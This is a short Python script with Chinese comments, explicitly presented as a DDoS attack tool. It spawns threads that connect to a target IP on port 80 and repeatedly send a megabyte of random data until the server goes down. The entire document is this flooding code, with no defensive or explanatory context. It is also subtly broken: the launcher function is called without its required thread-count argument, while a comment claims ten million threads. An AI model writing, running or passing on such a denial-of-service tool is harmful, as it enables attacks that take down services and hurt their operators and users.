import socket
import random
import threading

target_ip = ""  # 目标服务器IP地址
target_port = 80  # 目标服务器端口

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            data = random._urandom(1024**2)  # 生成随机数据包
            s.send(data)
            print("DDoS攻击已发送")
        except socket.error:
            print("目标服务器已经宕机")
            break

def multi_thread_ddos(n_threads):
    threads = []
    for i in range(n_threads):
        t = threading.Thread(target=ddos_attack)
        threads.append(t)
        t.start()

if __name__ == "__main__":
    multi_thread_ddos()  # 编写代码启动10000000个线程进行DDoS攻击
